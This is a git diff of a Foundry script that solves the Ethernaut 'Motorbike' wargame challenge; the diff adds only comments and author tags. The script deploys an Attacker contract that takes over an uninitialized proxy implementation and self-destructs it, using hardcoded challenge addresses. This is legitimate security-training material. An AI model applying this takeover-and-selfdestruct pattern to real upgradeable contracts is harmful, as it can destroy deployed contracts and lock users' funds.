@@ -5,7 +5,6 @@ import {Script, console} from "forge-std/Script.sol";
 import {DoubleEntryPoint, CryptoVault, Forta, LegacyToken} from "../src/DoubleEntryPoint.sol";
 import "openzeppelin-contracts-08/contracts/token/ERC20/ERC20.sol";
 
-
 /**
  * Solution:
  * =====================================================================================
@@ -40,6 +39,7 @@ import "openzeppelin-contracts-08/contracts/token/ERC20/ERC20.sol";
  * In order to make this work take a at EIP-6780 and EIP-7702.
  * 
  */
+
 interface IMotorbike {
     function upgrader() external view returns(address);
     function horsePower() external view returns(uint256);
@@ -70,6 +70,8 @@ contract Attacker {
     }
 }
 
+/// @author agadzhalov
+/// @title Solution to Motorbike Ethernaut challenge
 contract MotorbikeScript is Script {
 
     IMotorbike motorbike;
@@ -78,14 +80,26 @@ contract MotorbikeScript is Script {
 
     function run() public {    
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        // Initialize the motorbike interface with the target contract address
         motorbike = IMotorbike(0xe511d86353eF875cF1155f38d774308808DCDd02);
-        // to get the engine use cast storage
+
+        // To get the engine use cast storage
         // cast storage 0xe511d86353eF875cF1155f38d774308808DCDd02 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url
         engine = IEngine(0x76320f81677dc48eAbC4E98030316BBD5ba109E9);
+
+        // Logging the initial state of `engine` with its `upgrader` and `horsePower` attributes
         console.log("First state", engine.upgrader(), engine.horsePower());
+
+        // Deploying the `Attacker` contract targeting the `engine`
         attacker = new Attacker(address(engine));
+
+        // Logging state of `engine` after the `Attacker` deployment
         console.log("Second state", engine.upgrader(), engine.horsePower());
+
+        // Triggering the self-destruct functionality on the `engine` (not compatible with Cancun upgrade)
         attacker.destroyEngine(); // this won't work in Cancun upgrade.
+        
         vm.stopBroadcast();
     }
 }
